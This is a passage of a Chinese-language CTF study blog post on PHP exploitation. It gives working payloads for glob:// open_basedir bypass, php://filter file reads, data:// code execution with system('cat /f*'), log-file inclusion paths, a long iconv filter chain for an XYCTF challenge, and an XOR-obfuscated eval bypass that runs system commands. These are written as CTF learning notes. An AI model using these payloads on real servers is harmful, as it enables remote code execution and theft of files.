+<h2 id="四、伪协议"><a href="#四、伪协议" class="headerlink" title="四、伪协议"></a>四、伪协议</h2><h3 id="1-glob-伪协议"><a href="#1-glob-伪协议" class="headerlink" title="1.glob:&#x2F;&#x2F;伪协议"></a>1.glob:&#x2F;&#x2F;伪协议</h3><p>使用 glob:&#x2F;&#x2F; 伪协议绕过 open_basedir，读取根目录下的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = new DirectoryIterator(&quot;glob:///*&quot;); // 创建一个DirectoryIterator对象，遍历根目录</span><br><span class="line">foreach ($a as $f) &#123; // 遍历每个条目</span><br><span class="line">    echo($f-&gt;__toString() . &#x27; &#x27;); // 输出条目的名称，并添加一个空格</span><br><span class="line">&#125;</span><br><span class="line">exit(0); // 终止脚本执行</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;</span><br><span class="line">   echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-php-filter"><a href="#2-php-filter" class="headerlink" title="2.php:&#x2F;&#x2F;filter"></a>2.php:&#x2F;&#x2F;filter</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=http://www.example.com        //没有进行任何过滤，直接读取</span><br><span class="line">php://filter/read=string.toupper/resource=xxx.php    //对文件的内容进行大写转换后读取</span><br><span class="line">php://filter/convert.base64-encode/resource=xxx.php        //对文件进行base64加密后读取</span><br><span class="line">php://filter/read=string.toupper|string.rot13/resource=xxx.php    //对文件的内容进行大写转换后并使用rot13加密后读取</span><br><span class="line">php://filter/write=string.rot13/resource=example.txt&quot;,&quot;Hello World  </span><br><span class="line">//这会通过 rot13 过滤器筛选出字符 &quot;Hello World&quot;,然后写入当前目录下的 example.txt</span><br><span class="line">php://filter/read=string.rot13/resource=hello.php</span><br><span class="line">php://filter/string.rot13/resource=imposible.php</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<h3 id="3-data-伪协议"><a href="#3-data-伪协议" class="headerlink" title="3.data:&#x2F;&#x2F;伪协议"></a>3.data:&#x2F;&#x2F;伪协议</h3><p>需满足<code>allow_url_fopen</code>，<code>allow_url_include</code>同时开启才能使用</p>
+<p><strong>eg：</strong></p>
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250913170647274.png" alt="image-20250913170647274"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgL2YqIik7</span><br><span class="line">?c=data://text/plain,&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="五、日志包含"><a href="#五、日志包含" class="headerlink" title="五、日志包含"></a>五、日志包含</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于Apache，日志存放路径：/var/log/apache/access.log</span><br><span class="line">对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、LFI（本地文件目录）"><a href="#六、LFI（本地文件目录）" class="headerlink" title="六、LFI（本地文件目录）"></a>六、LFI（本地文件目录）</h2><h4 id="XYCTF-连连看到底是连连什么看"><a href="#XYCTF-连连看到底是连连什么看" class="headerlink" title="XYCTF 连连看到底是连连什么看"></a>XYCTF 连连看到底是连连什么看</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$p=$_GET[&#x27;p&#x27;];</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/http|=|php|file|:|\/|\?/i&quot;, $p))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;waf!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload=&quot;php://filter/$p/resource=/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">if(file_get_contents($payload)===&quot;XYCTF&quot;)&#123;</span><br><span class="line">    echo file_get_contents(&#x27;/flag&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>代码审计 鉴定为php_filter_chian</p>
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-24%20200443.png" alt="屏幕截图 2025-04-24 200443"></p>
+<p>直接打的话XYCTF后会有脏数据</p>
+<p>手动加||string.strip_tags过滤器来去除php标签</p>
+<p>构造XYCTF&lt;?php</p>
+<p>最终payload为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250424200546514.png" alt="image-20250424200546514"></p>
+<h2 id="七、eg"><a href="#七、eg" class="headerlink" title="七、eg"></a>七、eg</h2><h3 id="1-什么符号都没有过滤"><a href="#1-什么符号都没有过滤" class="headerlink" title="1.什么符号都没有过滤"></a>1.什么符号都没有过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);$a = $_GET[&#x27;a&#x27;];if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$a))&#123;  die(&quot;no!&quot;);&#125;@eval($a);?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>采用取反、自增、异或等方法</p>
+<p>这里使用异或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+
+<p>以上是GET部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_=system(&#x27;ls&#x27;);</span><br><span class="line">_=system(&#x27;tac zheshiflag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>以上是POST部分</p>
+<h3 id="2-php原生类"><a href="#2-php原生类" class="headerlink" title="2.php原生类"></a>2.php原生类</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$sys = $_GET[&#x27;sys&#x27;];</span><br><span class="line">if (preg_match(&quot;|flag|&quot;, $xsx)) &#123;</span><br><span class="line">           die(&quot;flag is no here!&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $xsx = $_GET[&#x27;xsx&#x27;];</span><br><span class="line">    echo new $sys($xsx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sys=SplFileObject&amp;xsx=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/03/18/php%E7%89%B9%E6%80%A7/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/03/13/php/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
